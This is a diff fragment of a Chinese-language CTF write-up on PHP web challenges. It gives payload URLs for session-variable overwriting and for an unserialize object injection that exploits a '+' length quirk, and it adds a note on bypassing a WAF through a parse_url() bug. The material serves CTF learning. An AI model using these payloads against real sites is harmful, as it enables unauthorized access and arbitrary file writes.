@@ -52,3 +52,6 @@ payload: `http://foobar/challenge7.php?_SESSION[logged]=1 (POST: _SESSION=1)`
 PHP反序列化的一个小特性，反序列化时会忽略掉用来表示长度的数字前面的`+`，大概是把`+`当作正号来处理了吧。详情参考:http://www.2cto.com/kf/201309/246310.html
 
 payload:`http://foobar/challenge8.php?data=O:%2B8:"just4fun":1:{s:8:"filename";s:9:"sbztz.php";}`
+
+### challenge9:
+很明显的变量覆盖，覆盖掉$query_parts，但是有WAF不能获取数据，需要利用PHP parse_url()函数的BUG来解题([https://bugs.php.net/bug.php?id=55511](https://bugs.php.net/bug.php?id=55511))，通过`///x.php?key=value`的方式可以使其返回 False，从而达到绕过WAF的目的，
